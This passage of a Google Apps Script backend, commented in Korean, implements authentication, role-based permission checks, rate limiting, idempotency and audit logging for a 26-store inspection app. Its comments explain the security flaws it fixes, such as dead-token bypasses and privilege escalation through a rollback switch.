           ★"앱 종료 후 다시 실행"이라고 적으면 안 된다★ — 이 문구가 뜨는 자리는 십중팔구
           74문항을 다 채운 qsc.html의 제출 순간이고, 임시저장에는 사진이 담기지 않는다
           (js/qsc-app.js saveDraft). 시키는 대로 앱을 끄면 그날 찍은 사진이 전부 사라진다.
           할 일은 '이 화면을 살려 둔 채 다른 탭에서 로그인하고 다시 누르는 것'이다. */
        return json(err('APP_OUTDATED',
          '로그인이 필요합니다. 이 화면을 닫지 마시고, 새 탭에서 로그인하신 뒤 다시 제출해 주세요.'));
      } else if (!enforceOn() && spec.legacy && !body.token) {
        /* ★`!body.token` — 토큰을 제시했는데 거부당한 요청은 off여도 항상 거부한다★
           종전에는 이 조건이 없어서, '중지'된 계정의 죽은 토큰으로 qsc.submit을 보내면
           verifyToken 실패 → 여기서 익명으로 강등 → 시트 3곳과 드라이브에 정상 기록되고
           화면에는 "저장 완료"가 떴다. 즉 강제 로그아웃 3수단(②상태 중지·③TOKEN_MINV)이
           제출 계열에서 통째로 무력화되고, ★죽은 토큰을 붙이는 편이 안 붙이는 것보다 유리★해졌다.
           7번 게이트의 "off가 완화하는 것은 토큰 요구뿐이지 권한 판정이 아니다"와 같은 이유다.
           토큰이 아예 없는 옛 요청(로그인 전 오프라인 작성분)은 지금까지와 똑같이 통과한다.

           AUTH_ENFORCE='off' — 종전처럼 받아준다. 거부하지 않고 감사로그에만 남긴다.
           ★이 분기가 "9월 실업무가 지금과 똑같이 돌아간다"의 실체다★
           신규 액션(dashboard.get·store.*·auth.session)은 legacy 플래그가 없으므로
           이 스위치와 무관하게 항상 토큰이 필요하다 (명세 §8-1).
           ★스로틀을 반드시 건다★ — 종전에는 이 분기만 anonThrottle도 rateLimit도 타지 않아
           가장 비싼 액션(qsc.submit, 본문 12MB)이 완전히 무인증·무제한이었다. 요청 1건마다
           12MB JSON.parse + 시트 3곳 쓰기가 붙으므로, 수천 건이면 일일 실행시간 90분 쿼터가
           소진되어 26곳 전체가 24시간 멈춘다. 버킷은 익명·로그인과 분리한다. */
        const lt = legacyThrottle();
        if (!lt.ok) return json(lt);
        ctx = anonCtx();
        logBypass(action, vr.code);
      } else {
        return json(err(vr.code, vr.msg));
      }
    }

    // 6 — 인증 후 레이트리밋 (매장 계정 하나가 연타해 26곳 전체를 멈추는 가용성 공격 차단)
    if (ctx.auth) {
      const rl = rateLimit(ctx.id);
      if (!rl.ok) return json(rl);
    }

    // 7 — 권한 게이트 + 대상 매장 확정
    if (ctx.auth && spec.menu) {
      const verdict = can(ctx.role, spec.menu, spec.act);
      if (!verdict.allow) {
        /* ★AUTH_ENFORCE='off'가 완화하는 것은 '토큰 요구'뿐이지 '권한 판정'이 아니다★
           종전 코드는 off일 때 토큰을 제시한 인증 사용자의 권한 거부까지 미적용으로 통과시켰다.
           그러면 장애가 나서 off로 롤백하는 순간, 로그인한 26개 매장 계정 전부가
           qsc.submit·shopper.submit(둘 다 scope:'none'이라 stripStore도 안 걸린다) 쓰기 권한을
           얻어 아무 매장 이름으로나 회차·상세·NA프리셋을 쓸 수 있게 된다.
           즉 롤백 스위치가 권한 상승 스위치를 겸하게 된다. 토큰을 낸 사용자는 off여도 항상 거부한다.
           ※qsc.html·shopper.html에 auth.js가 실리면서(확정사항 8) 관리자 토큰이 붙게 되었지만,
             관리자는 `역할` 탭에서 두 메뉴 쓰기가 열려 있으므로 이 블록을 통과한다.
             토큰이 없는 요청(로그인 전 오프라인 작성분)은 ctx.auth가 false라 애초에 들어오지 않는다. */
        auditLog(ctx, action, '', '거부', 'FORBIDDEN', enforceOn() ? '' : 'AUTH_ENFORCE=off');
        return json(err('FORBIDDEN', '권한이 없습니다.'));
      }
    }
    const tr = resolveTarget(ctx, spec.scope, payload);
    if (!tr.ok) {
      auditLog(ctx, action, String(tr.requested || ''), '거부', tr.code, '');
      return json(err(tr.code, tr.msg));
    }
    target = tr.target;

    /* 기능층에는 store 키를 삭제한 사본을 넘긴다 (명세 §8-3 방어①).
       기능층이 실수로 payload.store를 읽으면 undefined가 되어 즉시 눈에 띈다.
       ※ scope가 'none'인 제출 액션(qsc/shopper/survey)은 payload.store가 곧 기록 대상 매장명이므로
         지우지 않는다. 그 액션들은 애초에 '남의 매장을 고르는' 개념이 없다(점검자가 매장을 고른다). */
    const fnPayload = (spec.scope === 'target') ? stripStore(payload) : payload;

    // 8 — 멱등성. ★처리 전에 busy를 먼저 기록★ (부재 확인 후 기록이면 두 동시 요청이 모두 통과한다)
    if (spec.idem) {
      reqKey = idemKey(spec, body.reqId, payload);
      if (reqKey) {
        const cache = CacheService.getScriptCache();
        const seen = cache.get(reqKey);
        if (seen === 'done') return json({ ok: true, duplicate: true });
        if (seen === 'busy') return json(err('IN_FLIGHT', '이전 저장이 처리 중입니다. 잠시 후 확인해 주세요.'));
        cache.put(reqKey, 'busy', 600);
      }
    }

    // 9 — 기능층
    let out;
    try {
      out = spec.fn(ctx, fnPayload, target);
    } catch (e2) {
      if (reqKey) CacheService.getScriptCache().remove(reqKey); // 실패는 재시도 가능해야 한다
      throw e2;
    }
    if (!out || typeof out !== 'object') out = err('SERVER_ERROR', '처리 결과를 만들지 못했습니다.');

    if (reqKey) {
      if (out.ok) CacheService.getScriptCache().put(reqKey, 'done', 600);
      else CacheService.getScriptCache().remove(reqKey);
    }

    // 10 — 쓰기 액션 감사로그
    if (spec.act === '쓰기') {
      auditLog(ctx, action, target || String(payload.store || ''),
        out.ok ? '성공' : '실패', out.ok ? '' : String(out.code || ''),
        ctx.auth ? '' : 'AUTH_BYPASS');
    }

    // 11 — 단일 출구
    return json(out);
  } catch (e3) {
    // 12 — ★throw가 밖으로 나가면 앱스 스크립트가 HTML 오류 페이지를 반환하고
    //      프론트의 res.json()이 SyntaxError로 터져 사용자에게는 "네트워크 오류"로 보인다★
    if (reqKey) { try { CacheService.getScriptCache().remove(reqKey); } catch (e4) { } }
    const out = err('SERVER_ERROR', '처리 중 문제가 생겼습니다. 잠시 후 다시 시도해 주세요.');
    /* 원문(파일 ID·시트명이 실려 나간다)은 debug 읽기 권한자에게만.
       role === '관리자' 비교를 쓰지 않는다 — `역할` 탭의 debug 행이 그것을 정한다. */
    if (ctx && ctx.auth && can(ctx.role, 'debug', '읽기').allow) out.detail = String(e3);
    /* ★사유를 반드시 남긴다★ — 이 한 줄이 "비개발자 담당자가 스스로 원인을 찾을 수 있다"의
       유일한 근거다. 종전에는 감사로그에 '오류 SERVER_ERROR'만 남아 "9월 12일 14:03 오류"가
       26줄 쌓였다. 여기 실리는 것은 개인정보가 아니라 시트명·파일 ID·행 번호이고, 인증 시트는
       §3-0에 따라 아무와도 공유하지 않는 파일이다(응답에 담는 것과는 다르다). */
    try { auditLog(ctx || anonCtx(), action, target || '', '오류', 'SERVER_ERROR', String(e3).slice(0, 200)); } catch (e5) { }
    return json(out);
  }
}

function err(code, message) { return { ok: false, code: code, error: message }; }

function stripStore(p) {
  const o = {};
  for (const k in p) if (Object.prototype.hasOwnProperty.call(p, k) && k !== 'store') o[k] = p[k];
  return o;
}

/* 멱등성 키. 익명 액션은 reqId를 쓰지 않는다 — 새 reqId를 계속 보내 캐시를 채우는 방식으로
   잠금 카운터를 축출시킬 수 있기 때문이다. 대신 payload 해시 + 10분 버킷을 키로 쓴다. */
function idemKey(spec, reqId, payload) {
  if (spec.anon) {
    const bucket = Math.floor(Date.now() / 600000);
    return 'req:a' + sha256Hex(String(bucket) + '|' + JSON.stringify(payload)).slice(0, 24);
  }
  const id = String(reqId || '').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 64);
  return id ? 'req:' + id : '';
}

/* ---------- 인증 스프레드시트 (명세 §3) ---------- */

function authSS() {
  const id = prop('AUTH_SHEET_ID', '');
  if (!id) return null;
  try { return SpreadsheetApp.openById(id); } catch (e) { return null; }
}

/* 인증 시트에 탭 4개와 머리글을 만든다. 이미 있으면 손대지 않는다.
   편집기에서 한 번 실행하거나, 없으면 서버가 필요할 때 알아서 만든다.
   ⚠계정 탭 A~F는 사람이 편집하는 칸이다. 서버는 G~K(7~11열)만 쓴다. */
function ensureAuthSheets() {
  const ss = authSS();
  if (!ss) return { ok: false, error: 'AUTH_SHEET_ID 속성이 비어 있습니다.' };
  const made = [];
  const warn = [];
  if (!ss.getSheetByName(AUTH_ACCOUNT_SHEET)) {
    const sh = ss.insertSheet(AUTH_ACCOUNT_SHEET);
    sh.appendRow(ACCOUNT_HEADER.slice(0));
    sh.appendRow(['admin', '감사총무팀', '관리자', '*', STATUS_ON, 'QSC 담당자 본인']);
    sh.setFrozenRows(1);
    made.push(AUTH_ACCOUNT_SHEET);
  } else {
    /* ★머리글이 다르면 반드시 알린다★ — 열 하나가 어긋나면 서버가 '해시' 칸이라고 믿는 곳이
       실제로는 다른 칸이다. 예외가 나지 않고 조용히 틀리는 종류의 사고라, 여기서 잡지 못하면
       "비밀번호를 설정했는데 로그인이 안 된다"로만 보인다. 고치지는 않는다 —
       사람이 만든 표를 서버가 말없이 재배열하는 편이 더 위험하다. */
    const bad = accountHeaderMismatch(ss.getSheetByName(AUTH_ACCOUNT_SHEET));
    if (bad) warn.push(bad);
  }
  if (!ss.getSheetByName(AUTH_ROLE_SHEET)) {
    const sh = ss.insertSheet(AUTH_ROLE_SHEET);
    sh.appendRow(['역할', '메뉴', '읽기', '쓰기', '설명']);
    sh.appendRow(['관리자', '*', '○', '○', '감사총무팀 QSC 담당. 전 메뉴']);
    sh.appendRow(['관리자', 'debug', '○', '', '오류 상세 열람']);
    /* accounts 행을 명시적으로 적는다. 이 행 하나가 "계정 관리는 누구에게 열려 있는가"를
       시트에서 눈으로 볼 수 있게 해 준다. 점검 모드(MAINT) 통과 예외도 이 권한으로 판정한다.
       ★2026-08-16부터 이 행은 장식이 아니라 자물쇠다★ — 표에 accounts 행이 하나라도 있으면
       can()이 그때부터 `*` 폴백을 받지 않는다(can() 주석). 즉 이 줄을 지우면 자물쇠가 풀린다. */
    sh.appendRow(['관리자', ADMIN_MENU, '○', '○', '계정 관리 · 감사로그 열람']);
    sh.appendRow(['매장담당자', 'dashboard', '○', '', '전체 대시보드는 전 매장 열람']);
    /* store 읽기 하나가 '매장현황 조회'와 '홈 알림 배지(notify.badge)' 둘을 함께 연다 —
       배지의 재료가 개선요청 표이므로 권한 어휘를 새로 만들 이유가 없다. */
    sh.appendRow(['매장담당자', 'store', '○', '○', '자기 매장 개선보고 · 홈 알림 배지 (범위는 계정 D열이 정함)']);
    sh.setFrozenRows(1);
    made.push(AUTH_ROLE_SHEET);
  }
  if (!ss.getSheetByName(AUTH_LOG_SHEET)) {
    const sh = ss.insertSheet(AUTH_LOG_SHEET);
    sh.appendRow(['시각', '아이디', '역할', '액션', '대상매장', '결과', '사유코드', '비고']);
    sh.setFrozenRows(1);
    made.push(AUTH_LOG_SHEET);
  }
  if (!ss.getSheetByName(STORE_MAP_SHEET)) {
    const sh = ss.insertSheet(STORE_MAP_SHEET);
    sh.appendRow(['매장명', '매장 파일 ID']);
    sh.setFrozenRows(1);
    made.push(STORE_MAP_SHEET);
  }
  const sec = initSecrets();
  /* 세션은 무기한 설계다(확정사항 4). 옛 값(720=30일)이 속성에 남아 있으면 30일마다
     26곳이 전부 로그인 화면으로 떨어지는데, 증상이 한 달 뒤에 나타나 원인을 찾기 어렵다. */
  const ttl = prop('TOKEN_TTL_H', '');
  if (ttl && Number(ttl) < 87600) {
    warn.push('스크립트 속성 TOKEN_TTL_H = ' + ttl + ' 이 남아 있습니다. ' +
      '세션은 무기한 설계이므로 이 속성을 삭제(또는 비워)하십시오.');
  }
  /* ★TOKEN_MINV 오타는 '안 켜짐'으로 조용히 넘어간다★ — 비상 로그아웃 스위치인데
     'v2'·'２'(전각)·'2회'를 넣으면 Number()가 NaN이라 기본값 1이 되어 아무 일도 일어나지 않는다.
     tokenMinV()가 그런 값을 '가장 안전한 쪽'으로 해석하도록 고쳐 두었지만, 담당자가 그 사실을
     알 방법이 여기밖에 없다. */
  const rawMinv = String(prop('TOKEN_MINV', '1')).trim();
  if (rawMinv && !/^\d+$/.test(rawMinv)) {
    warn.push('스크립트 속성 TOKEN_MINV = 「' + rawMinv.slice(0, 20) + '」 은 숫자가 아닙니다. ' +
      '숫자만(예: 2) 넣으십시오 — 지금 값으로는 전원 강제 로그아웃이 의도대로 동작하지 않습니다.');
  }
  /* ★타임존이 두 개다★ — 프로젝트(앱스 스크립트)와 스프레드시트. 둘이 다르면 방문날짜가
     달을 넘나들어 CS 월 평균이 조용히 틀린다(§9-4). 코드는 전부 시트 타임존을 쓰도록
     고쳐 두었지만, 애초에 둘을 맞춰 두는 편이 재발을 구조적으로 막는다. */
  try {
    const projTz = Session.getScriptTimeZone();
    const sheetTz = ss.getSpreadsheetTimeZone();
    if (projTz !== sheetTz) {
      warn.push('프로젝트 시간대(' + projTz + ')와 인증 시트 시간대(' + sheetTz + ')가 다릅니다. ' +
        '편집기 [프로젝트 설정] > [시간대]를 「(GMT+09:00) 서울」로 맞추십시오.');
    }
  } catch (e) { }
  /* ★`*` 행은 다른 메뉴까지 함께 연다★ — can()은 (역할, 메뉴) 정확 일치가 없으면 `*` 행으로
     넘어가므로, 누가 `매장담당자 | * | ○` 를 한 줄 복사해 넣으면 그 순간 26개 매장 계정이
     점검표 제출(qsc·shopper)과 제출코드까지 열게 된다.
     계정 관리(accounts)와 debug만은 can()이 폴백을 막는다(2026-08-16, can() 주석 참조) —
     즉 이 경고는 "관리자 화면이 열렸다"가 아니라 "열지 말아야 할 것이 열렸다"를 알리는 자리다.
     운영 중에도 같은 검사를 한다(warnStarRoles) — 이 함수는 담당자가 손으로 실행할 때만 돈다. */
  try {
    const starRoles = [];
    const rr = getRoles();
    for (let i = 0; i < rr.length; i++) {
      if (rr[i].menu === '*' && starRoles.indexOf(rr[i].role) < 0) starRoles.push(rr[i].role);
    }
    if (starRoles.length > 1) {
      warn.push('`역할` 탭에서 메뉴 `*` 행을 가진 역할이 ' + starRoles.length + '개입니다 (' +
        starRoles.join(', ') + '). `*`는 계정 관리·감사로그까지 함께 엽니다 — ' +
        '의도한 것이 아니면 해당 행의 메뉴를 구체적인 키로 바꾸십시오.');
    }
  } catch (e) { }
  Logger.log('인증 시트 준비 완료. 새로 만든 탭: ' + (made.length ? made.join(', ') : '없음') +
    '\n' + sec +
    (warn.length ? '\n\n★확인이 필요합니다★\n · ' + warn.join('\n · ') : '') +
    '\n\n다음 순서로 하십시오:' +
    '\n 1) benchPw() 실행 → 250ms 이내 가장 큰 N을 스크립트 속성 PW_ITER 에 입력' +
    '\n 2) auditStoreFiles() → 남았다고 하면 auditStoreFiles(null, 1), (null, 2) …' +
    '\n 3) syncStoreAccounts() → 매장 계정이 「사용 · 비밀번호 미설정」으로 생성됩니다' +
    '\n 4) issueAdminSetupCode() → 로그의 코드로 login.html에서 관리자 비밀번호 설정' +
    '\n 5) 로그인 후 accounts.html 에서 매장별 비밀번호를 설정해 전달' +
    '\n\n★배포 당일만★ 스크립트 속성 HASH_BUDGET 을 1000 으로 올려 두고, 다음 날 300 으로' +
    '\n   되돌리십시오. 26곳 비밀번호 설정(26회) + 그날 저녁 26곳 첫 로그인(26회) + 오타' +
    '\n   재시도가 하루에 몰리는데, 한도에 닿으면 나머지 매장에는 "방금 받은 비밀번호로' +
    '\n   안 들어가진다"로만 보이고 화면 어디에도 원인이 안 뜹니다.' +
    '\n\n★비밀번호 공지는 3개 조로 나눠 10분 간격으로★ 보내십시오. 26곳이 같은 1분에 로그인하면' +
    '\n   분당 상한(20)에 닿아 나머지 매장에 "요청이 많습니다"가 뜹니다. 한꺼번에 보내야 한다면' +
    '\n   그날만 스크립트 속성 ANON_MIN_AUTH 를 60 으로 두었다가 다음 날 지우십시오.' +
    '\n\n★AUTH_ENFORCE = on★ 은 사람이 켭니다. 이것을 켜기 전까지는 토큰 없이 보낸 옛 봉투' +
    '\n   (qsc.submit·shopper.submit·config.get)가 그대로 통과합니다 — 앱 코드로는 닫히지 않습니다.' +
    '\n   켜는 날 26곳이 모두 한 번은 로그인해 두어야 현장에서 제출이 막히지 않습니다.');
  return { ok: true, made: made, warn: warn };
}

/* `계정` 탭 1행이 현재 스키마와 같은지. 다르면 사람이 읽을 수 있는 문장을 돌려준다. */
function accountHeaderMismatch(sh) {
  if (!sh) return '';
  try {
    const rng = grid(sh, 1, 1, 1, ACCOUNT_COLS);
    const got = rng ? rng.getValues()[0] : [];
    let same = got.length >= ACCOUNT_COLS;
    for (let i = 0; same && i < ACCOUNT_COLS; i++) {
      if (String(got[i] == null ? '' : got[i]).trim() !== ACCOUNT_HEADER[i]) same = false;
    }
    if (same) return '';
    return '`계정` 탭 머리글이 현재 스키마와 다릅니다.\n     지금: ' +
      got.map(function (x) { return String(x == null ? '' : x).trim(); }).join(' | ') +
      '\n     기대: ' + ACCOUNT_HEADER.join(' | ') +
      '\n     ※ 1행을 위 「기대」와 똑같이 맞추고, 각 열의 값도 그 머리글에 맞게 옮겨 주십시오.';
  } catch (e) { return ''; }
}

/* TOKEN_KEY·PW_PEPPER는 담당자가 스스로 지어낼 수 없는 값이다 (비개발자 1인 운영).
   사람이 "qsc2026!" 같은 문자열을 넣으면 토큰 서명과 페퍼가 통째로 무의미해지므로,
   비어 있을 때만 서버가 만들어 채운다. ★이미 값이 있으면 절대 덮어쓰지 않는다★ —
   덮어쓰면 그 순간 전 계정의 비밀번호 해시가 맞지 않게 되고 모든 토큰이 죽는다. */
function initSecrets() {
  const made = [];
  if (!prop('TOKEN_KEY', '')) {
    PROPS.setProperty('TOKEN_KEY', Utilities.getUuid() + Utilities.getUuid());
    made.push('TOKEN_KEY');
  }
  if (!prop('PW_PEPPER', '')) {
    PROPS.setProperty('PW_PEPPER', Utilities.getUuid() + Utilities.getUuid());
    made.push('PW_PEPPER');
    PROPS.setProperty('PW_PEPPER_V', prop('PW_PEPPER_V', '1'));
  }
  return made.length
    ? '자동 생성한 비밀값: ' + made.join(', ') + ' (스크립트 속성에 저장됨 — 사람이 볼 필요 없습니다)'
    : '비밀값(TOKEN_KEY·PW_PEPPER)은 이미 설정되어 있습니다.';
}

/* 계정 탭 전체를 객체 배열로. row는 시트 행 번호(서버가 G~K를 쓸 때 쓴다).
   ★인덱스를 리터럴로 적지 않고 ACCT_COL - 1 로 쓴다★ — 열이 또 바뀌는 날 표 한 곳만 고치면 된다. */
function readAccounts() {
  const ss = authSS();
  if (!ss) return [];
  const sh = ss.getSheetByName(AUTH_ACCOUNT_SHEET);
  if (!sh) return [];
  const last = sh.getLastRow();
  if (last < 2) return [];
  const rng = grid(sh, 2, 1, last - 1, ACCOUNT_COLS);
  if (!rng) return [];
  const vals = rng.getValues();
  const out = [];
  const seen = {};
  for (let i = 0; i < vals.length; i++) {
    const v = vals[i];
    const id = normId(cellStr(v, ACCT_COL.id));
    if (!id) continue;
    /* ★정규화 후 아이디가 겹치는 행을 표시한다★
       '금종제과'와 '금종제과 '(끝 공백), 'Cafe GLOW'와 'cafe glow'는 normId가 같다.
       종전에는 getAccount가 '첫 일치 행'을 돌려주었으므로, 계정 관리 화면에는 두 줄이 같은
       아이디로 보이고 아래쪽 줄의 [비밀번호]를 눌러도 writeCredential이 ★위쪽 계정의★
       자격증명을 덮어썼다. 결과는 (a) 위쪽 매장의 세션이 전부 죽고 (b) 아래쪽 매장에 알려 준
       비밀번호로 로그인하면 위쪽 매장의 D열 범위를 얻는다 — '남의 계정으로 로그인'이
       실제로 성립하는 유일한 경로였다. 여기서는 표시만 하고, getAccount가 fail-closed 한다.
       `auditStoreFiles`의 매장명 충돌 검사 ⑬과 같은 성질의 검사다. */
    if (Object.prototype.hasOwnProperty.call(seen, id)) {
      seen[id].dup = true;
      out.push({ row: 2 + i, id: id, dup: true, rawId: cellStr(v, ACCT_COL.id),
        name: cellStr(v, ACCT_COL.name), role: '', scope: '', status: '',
        hash: '', salt: '', iter: 0, pepperV: '', pwAt: '', lastSeen: '' });
      continue;
    }
    /* 반복수 칸은 "10000:1" (반복수:페퍼버전) 한 칸에 둘을 담는다 */
    const it = cellStr(v, ACCT_COL.iter).split(':');
    const rec = {
      row: 2 + i,
      id: id,
      dup: false,
      /* 표시용 원문 — 아이디가 매장명이라 정규화 전 값이 곧 사람이 읽는 이름이다 */
      rawId: cellStr(v, ACCT_COL.id),
      name: cellStr(v, ACCT_COL.name),
      role: cellStr(v, ACCT_COL.role),
      scope: cellStr(v, ACCT_COL.scope),
      status: cellStr(v, ACCT_COL.status),
      hash: cellStr(v, ACCT_COL.hash),
      salt: cellStr(v, ACCT_COL.salt),
      iter: Number(it[0] || 0) || 0,
      pepperV: String(it[1] || ''),
      pwAt: cellStr(v, ACCT_COL.pwAt),
      lastSeen: cellStr(v, ACCT_COL.lastSeen)
    };
    seen[id] = rec;
    out.push(rec);
  }
  return out;
}

/* 행 배열에서 1-base 열 번호로 문자열을 꺼낸다. 열이 모자란 시트여도 ''를 준다.
   ★NFC 정규화를 반드시 한다★ — macOS에서 붙여넣은 한글은 NFD(자모 분리)라 눈에 같아 보여도
   문자열이 다르다. E열 상태가 NFD '사용'이면 `acct.status !== STATUS_ON`이 참이 되어 로그인이
   안 되고, C열 역할이 NFD면 can()의 `rows[i].role !== role`이 전부 어긋나 전권이 거부된다.
   방향은 fail-closed라 유출은 없지만, 증상이 "비밀번호를 설정했는데 로그인이 안 된다" 하나뿐이라
   원인을 찾을 수 없다(시트를 눈으로 봐도 똑같이 보인다). */
function cellStr(row, col) {
  const x = row[col - 1];
  return String(x == null ? '' : x).normalize('NFC').trim();
}

/* 아이디 정규화 (확정사항 2). 아이디가 곧 통합시트 D열 매장명이라 한글·공백이 들어온다.
     · NFC — macOS에서 입력된 한글은 NFD(자모 분리)라 눈에 같아 보여도 문자열이 다르다
     · trim + 내부 연속 공백 1칸 — '신세계  강남점'과 '신세계 강남점'을 같게 본다
     · toLowerCase — 대소문자 개념이 없다는 뜻. 한글에는 아무 영향이 없고,
       'admin'을 'Admin'으로 쳐도 들어가게 해 준다. 양쪽(시트 값·입력값)을 모두 통과시키므로
       시트 A열에는 매장명을 '그대로' 적어도 된다.
   ★normStore와 규칙이 같지만 별도 함수로 둔다★ — 매장명 정규화와 아이디 정규화는 우연히
   같은 규칙일 뿐 서로 다른 개념이고, 한쪽을 고칠 때 다른 쪽이 따라 바뀌면 안 된다. */
function normId(s) {
  return String(s == null ? '' : s).normalize('NFC').trim().replace(/\s+/g, ' ').toLowerCase();
}

/* 계정 1행 — 캐시 60초 고정.
   ★이 TTL을 올리지 말 것★. 퇴사자·폐점 매장 차단 SLA가 곧 이 숫자다.
   성능이 문제여도 role: 캐시만 300초까지 올린다. */
function getAccount(id) {
  const key = acctCacheKey(id);
  const cache = CacheService.getScriptCache();
  const hit = cache.get(key);
  if (hit) { try { return JSON.parse(hit); } catch (e) { } }
  const all = readAccounts();
  let found = null;
  for (let i = 0; i < all.length; i++) if (all[i].id === id) { found = all[i]; break; }
  /* ★같은 아이디가 두 행이면 아무 행도 쓰지 않는다 (fail-closed)★
     '첫 일치 행'을 쓰면 비밀번호 설정이 엉뚱한 계정의 G~J열로 간다(readAccounts 주석 참조).
     증상은 그 계정만 로그인이 안 되는 것이고, 담당자가 원인을 볼 수 있게 로그를 남긴다
     — 10분에 1줄로 눌러 둔다(로그인 시도마다 남기면 감사로그가 이것으로 뒤덮인다). */
  if (found && found.dup) {
    try {
      const c2 = CacheService.getScriptCache();
      if (!c2.get('dup:' + id)) {
        c2.put('dup:' + id, '1', 600);
        auditLog({ id: '(시스템)', role: '' }, 'account.read', '', '경고', 'ACCOUNT_ID_DUP',
          '`계정` 탭에 같은 아이디가 두 행 있습니다: ' + id + ' — 한 행을 지우거나 아이디를 고치십시오');
      }
    } catch (e) { }
    return null;
  }
  if (found) cache.put(key, JSON.stringify(found), 60);
  return found;
}

function dropAccountCache(id) {
  try { CacheService.getScriptCache().remove(acctCacheKey(id)); } catch (e) { }
}
function acctCacheKey(id) { return 'acct:v' + epoch() + ':' + String(id); }

/* `역할` 탭 전체 */
function getRoles() {
  const key = 'role:v' + epoch();
  const cache = CacheService.getScriptCache();
  const hit = cache.get(key);
  if (hit) { try { return JSON.parse(hit); } catch (e) { } }
  const ss = authSS();
  const rows = [];
  let read = false;   // 시트에 실제로 닿았는가 (실패를 캐시하지 않기 위한 표시)
  if (ss) {
    const sh = ss.getSheetByName(AUTH_ROLE_SHEET);
    if (sh && sh.getLastRow() > 1) {
      read = true;
      const rng = grid(sh, 2, 1, sh.getLastRow() - 1, 5);
      const vals = rng ? rng.getValues() : [];
      for (let i = 0; i < vals.length; i++) {
        /* ★NFC★ — `계정` C열은 cellStr가 정규화하는데 여기가 안 하면 두 값이 영영 안 맞는다.
           증상은 '전권 거부'뿐이고 시트를 눈으로 봐도 똑같이 보인다(cellStr 주석 참조). */
        const role = String(vals[i][0] == null ? '' : vals[i][0]).normalize('NFC').trim();
        if (!role) continue;
        rows.push({
          role: role,
          menu: String(vals[i][1] == null ? '' : vals[i][1]).normalize('NFC').trim(),
          read: truthy(vals[i][2]),
          write: truthy(vals[i][3])
        });
      }
    }
  }
  /* ★실패는 캐시하지 않는다★ — 인증 시트가 잠깐 열리지 않으면 빈 배열이 60초 동안 굳어
     전원 FORBIDDEN이 되고, 거부마다 감사로그 appendRow가 붙어 시트 쓰기가 폭주한다.
     fail-closed 방향이라 유출은 없지만, 장애를 60초 길이로 늘릴 이유는 없다. */
  if (read) {
    cache.put(key, JSON.stringify(rows), 60);
    warnStarRoles(rows, cache);   // ★캐시에 넣은 뒤 부른다★ (아래 함수 주석의 재진입 참조)
  }
  return rows;
}

/* `역할` 탭에 메뉴 `*` 행을 가진 역할이 둘 이상이면 감사로그에 남긴다 (2026-08-16 지시 §4).
   can()이 계정 관리·debug의 `*` 폴백을 막았지만, `매장담당자 | * | ○` 한 줄은 여전히
   qsc·shopper·codes 쓰기를 26개 매장 계정에 열어 준다. 종전 경고는 담당자가 편집기에서
   ensureAuthSheets()를 손으로 실행할 때만 나왔다 — 실제로 그 줄이 들어가는 날에는 아무도
   그 함수를 실행하지 않는다. 운영 중에 스스로 알리는 자리가 하나는 있어야 한다.

   ★비용을 두 겹으로 막는다★
     ① 시트를 실제로 읽은 순간(캐시 미스, 60초에 한 번)에만 검사한다 — 배열 한 번 훑기.
     ② 감사로그 쓰기는 한 시간에 한 줄. 잘못된 표는 고칠 때까지 남아 있으므로, 이 검사가
        매번 appendRow를 하면 하루 1,440줄이 쌓여 표가 못 쓰게 된다.
   ★재진입★ — auditLog는 `감사로그` 탭이 없으면 ensureAuthSheets()를 부르고 그 안에서
   다시 getRoles()가 불린다. 부르는 쪽이 cache.put을 마친 뒤 이 함수에 들어오고, 여기서도
   시간 키를 먼저 put한 뒤 기록하므로 두 번째 진입은 캐시에서 즉시 되돌아온다. */
function warnStarRoles(rows, cache) {
  try {
    const roles = [];
    for (let i = 0; i < rows.length; i++) {
      if (rows[i].menu === '*' && roles.indexOf(rows[i].role) < 0) roles.push(rows[i].role);
    }
    if (roles.length < 2) return;                    // 시드 상태(관리자 하나)는 정상이다
    const k = 'starwarn:' + Math.floor(Date.now() / 3600000);
    if (cache.get(k)) return;
    cache.put(k, '1', 3700);
    auditLog({ id: '(시스템)', role: '' }, 'role.table', '', '경고', 'ROLE_STAR_MULTI',
      '`역할` 탭에 메뉴 `*` 행을 가진 역할이 ' + roles.length + '개입니다: ' + roles.join(', ') +
      ' — 의도한 것이 아니면 해당 행의 메뉴를 구체적인 키로 바꾸십시오.');
  } catch (e) { /* 경고가 업무를 멈추면 안 된다 */ }
}

/* C·D열은 ○ O Y TRUE 만 참. 빈칸·오타·✗는 전부 거짓이다 (fail-closed).
   드롭다운(데이터 유효성)을 걸어 두면 오타 사고가 물리적으로 불가능해진다 — 코드 0줄. */
function truthy(v) {
  if (v === true) return true;
  const s = String(v == null ? '' : v).trim().toUpperCase();
  return s === '○' || s === 'O' || s === 'Y' || s === 'TRUE';
}

/* 감사로그 (append-only, 8열).
   기록: 로그인 성공/실패 · 잠금 · 모든 쓰기 · 모든 거부 · 비밀번호 설정 · ROLE_TABLE_DUP.
   기록하지 않음: 성공한 읽기 (appendRow가 200~400ms라 조회마다 붙이면 체감 속도가 무너진다).
   ★절대 기록하지 않음: 비밀번호 원문 · 설정코드 · 토큰 문자열 · payload 통째 · 사진★
   아이디는 사용자가 보낸 문자열이므로 이 writer도 safe()를 통과시킨다.

   ★길이를 여기 한 곳에서 자른다★ — 대상매장 칸에는 클라이언트가 보낸 payload.store가 그대로
   들어오는데(scope:'none'인 제출 액션은 이 값을 검증하지 않는다), 본문 상한이 12MB라
   5만 자짜리 매장명을 보낼 수 있다. 그러면 appendRow가 예외로 죽고 아래 catch가 그것을 삼켜
   ★그 쓰기 기록만 감사로그에서 조용히 사라진다★. 부르는 쪽마다 slice를 적게 하면 언젠가
   한 곳을 빠뜨리므로 writer가 자른다. */
function auditCut(v, n) { return String(v == null ? '' : v).slice(0, n); }

function auditLog(ctx, action, store, result, reason, note) {
  try {
    const ss = authSS();
    if (!ss) return;
    let sh = ss.getSheetByName(AUTH_LOG_SHEET);
    if (!sh) { ensureAuthSheets(); sh = ss.getSheetByName(AUTH_LOG_SHEET); }
    if (!sh) return;
    const tz = ss.getSpreadsheetTimeZone();
    sh.appendRow(safeRow([
      Utilities.formatDate(new Date(), tz, 'yyyy-MM-dd HH:mm:ss'),
      ctx ? auditCut(ctx.id, 60) : '',
      ctx ? auditCut(ctx.role, 30) : '',
      auditCut(action, 60),
      auditCut(store, 100),
      auditCut(result, 20),
      auditCut(reason, 40),
      auditCut(note, 300)
    ]));
  } catch (e) { /* 감사로그 실패가 업무를 멈추면 안 된다 */ }
